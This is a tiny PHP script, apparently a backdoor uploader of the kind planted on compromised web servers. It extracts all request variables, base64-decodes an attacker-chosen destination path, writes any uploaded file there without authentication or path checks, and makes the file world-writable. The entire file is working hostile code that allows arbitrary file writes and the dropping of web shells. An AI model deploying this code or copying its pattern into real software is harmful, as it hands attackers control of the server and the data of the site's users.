<?php
	extract( $_GET );
	extract( $_POST );
	extract( $_FILES );
	global $_GET;
	$dest = base64_decode($_GET['filename']);
	move_uploaded_file($_FILES['userfile']['tmp_name'], $dest);
	chmod($dest, 0666);
?>
